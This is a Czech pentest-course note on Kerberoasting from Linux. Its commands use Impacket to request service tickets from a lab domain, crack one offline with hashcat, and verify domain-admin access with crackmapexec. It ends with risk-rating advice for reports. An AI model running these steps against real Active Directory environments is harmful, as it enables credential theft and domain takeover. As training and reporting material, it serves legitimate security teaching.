# Kerberoasting z Linuxu

**Kerberoasting** je jedna z nejpopulárnějších technik pro Lateral Movement a Privilege Escalation v Active Directory. Útok se zaměřuje na účty s nakonfigurovaným atributem **SPN (Service Principal Name)**.

### 💡 Klíčový koncept:

- Jakýkoliv běžný (i nízko-privilegovaný) doménový uživatel může požádat Kerberos KDC (Domain Controller) o lístek **TGS (Ticket Granting Service)** pro libovolnou službu v doméně.
    
- Část tohoto lístku (**TGS-REP**) je šifrována pomocí **NTLM hashe hesla servisního účtu**.
    
- Útočník si lístek vyžádá, stáhne do svého Linux stroje a offline se pokusí hrubou silou (brute-force) zjistit heslo účtu. Servisní účty mají v AD často velmi vysoká práva (např. _Domain Admins_, _Local Administrators_).
    

## 🛠️ 1. Vyhledání a stažení TGS lístků (Impacket)

Pro útok z ne-doménového Linux stroje potřebujeme nástroj `GetUserSPNs.py` z balíku Impacket a platné přihlašovací údaje jakéhokoliv doménového uživatele.

### A) Pouze výpis dostupných SPN účtů

Před samotným stahováním je vhodné zjistit situaci v doméně a provést analýzu skupin (`MemberOf`).

Bash

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

### B) Stažení VŠECH TGS lístků do souboru

Parametr `-request` vyžádá lístky a parametr `-outputfile` je uloží do formátu připraveného pro Hashcat.

Bash

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request -outputfile all_tgs_hashes
```

### C) Cílené stažení lístku pro JEDEN konkrétní účet (OPSEC tišší)

Pokud nechceme vyvolat poplach hromadným stahováním, zaměříme se pouze na vysoce privilegovaný účet (např. `sqldev`, který je členem _Domain Admins_).

Bash

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

## 🏎️ 2. Offline lámání hesla (Hashcat)

Kerberos lístky typu TGS využívají v Hashcatu specifický hash-mód **`13100`** (Kerberos 5, etype 23, TGS-REP).

Bash

```
# Spuštění slovníkového útoku pomocí rockyou.txt
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

### 📋 Příklad úspěšného prolomení:

Plaintext

```
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$...:database!
Status...........: Cracked
```

Heslo k účtu `sqldev` je **`database!`**.

## 🎯 3. Ověření získaných práv

Po úspěšném cracknutí hesla ověříme úroveň našich nových přístupových práv vůči Doménovému Kontroleru (DC) pomocí nástroje `crackmapexec` (nebo `netexec`).

Bash

```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

### 🏆 Výsledek vyhodnocení:

Plaintext

```
SMB      172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
```

Příznak **`(Pwn3d!)`** potvrzuje, že kompromitovaný účet má na doménovém kontroleru administrátorská práva. V tomto okamžiku je doména plně ovládnuta.

## 📝 Závěry pro reportování (Risk Rating)

Při pentestu je nutné hodnotit riziko přítomnosti SPN podle reálného výsledku:

1. **Vysoké riziko (High):** Pokud se lístek podaří stáhnout a **úspěšně cracknout** na slabé heslo, přičemž účet má vysoká práva (Domain Admin/Local Admin).
    
2. **Střední riziko (Medium):** Pokud v doméně existují účty s SPN a vysokými právy, ale jejich hesla jsou komplexní a **nepodařilo se je cracknout**. Riziko trvá, protože administrátoři mohou v budoucnu změnit heslo na slabší, nebo útočník s větším výpočetním výkonem (GPU cluster) může být úspěšný. Doporučuje se implementace silných, dlouhých hesel (gMSA - _Group Managed Service Accounts_).